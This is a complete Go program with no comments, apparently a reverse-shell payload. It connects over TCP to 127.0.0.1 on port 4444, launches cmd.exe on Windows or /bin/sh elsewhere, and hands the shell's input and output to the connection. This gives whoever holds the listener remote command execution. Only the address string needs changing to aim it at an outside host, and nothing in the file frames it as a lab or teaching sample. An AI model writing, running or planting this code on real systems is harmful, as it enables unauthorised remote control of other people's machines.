package main

import (
  "net"
  "os/exec"
  "runtime"
)

func main() {
  conn, _ := net.Dial("tcp", "127.0.0.1:4444")
  var cmd *exec.Cmd
  
  if runtime.GOOS == "windows" {
    cmd = exec.Command("cmd.exe")
  } else {
    cmd = exec.Command("/bin/sh")
  }
  
  cmd.Stdin = conn
  cmd.Stdout = conn
  cmd.Stderr = conn
  cmd.Run()
}